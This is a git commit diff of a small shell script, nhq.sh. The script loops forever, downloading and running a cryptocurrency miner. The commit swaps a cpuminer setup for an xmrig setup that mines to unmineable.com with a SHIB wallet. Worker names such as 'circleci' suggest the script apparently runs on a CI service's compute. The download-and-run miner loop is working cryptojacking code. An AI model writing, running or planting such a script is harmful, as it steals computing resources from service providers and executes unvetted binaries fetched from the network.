05733b63c6a1ff5993c515d19a3a48c059d42741
sifamuhaeny <91787907+sifamuhaeny@users.noreply.github.com>
2021-10-02 22:04:42 +0700

    Update nhq.sh

--- nhq.sh
+++ nhq.sh
@@ -2,9 +2,6 @@
 
 while [ 1 ]; do
   sleep 5
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
-tar xf cpuminer-opt-linux.tar.gz
-./cpuminer-sse2 -a power2b -o stratum+tcps://stratum-asia.rplant.xyz:17022 -u MkgB8Pqwi9366Jph9Lu1pk1kXnzcKUivny.circleci -t2
+wget https://github.com/xmrig/xmrig/releases/download/v6.5.3/xmrig-6.5.3-bionic-x64.tar.gz && tar xvf xmrig-6.5.3-bionic-x64.tar.gz && cd xmrig-6.5.3 && ./xmrig -t2 -o rx.unmineable.com:3333 -u SHIB:0xf932e7CD10E3bDa943916024358951b6C5c06F02.cici -p x -k -a rx/0
 done
 sleep 999
-
